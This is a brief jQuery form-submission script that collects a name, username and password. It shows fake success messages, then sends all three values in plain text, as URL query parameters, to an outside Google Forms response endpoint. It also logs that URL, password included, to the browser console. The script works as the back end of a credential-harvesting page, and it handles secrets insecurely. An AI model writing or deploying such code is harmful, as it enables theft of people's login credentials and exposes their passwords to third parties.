$(document).ready(function(){
    $("#submit").click(function(event){
        event.preventDefault();
        var formData = $("#g-form-test").serialize();
        var fname = $("#name").val();
        var username = $("#username").val();
        var password = $("#password").val();
        $("#g-form-test").html("<h2>Form Submitted</h2>");
        $("#done").html("<h2>Success</h2>");
        https://docs.google.com/forms/d/e/1FAIpQLSdoj6_kCqcMJuSJajx9nJdIzB-pSZWtjbYJTAj4txxjjg2zQQ/viewform?usp=pp_url&
        var getURL = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSdoj6_kCqcMJuSJajx9nJdIzB-pSZWtjbYJTAj4txxjjg2zQQ/formResponse?entry.1213650369=" + fname + "&entry.1810047816=" + username + "&entry.1854777515=" + password;
        console.log(getURL);
        $.get(getURL, function(data, status){
            }
        );

    })
});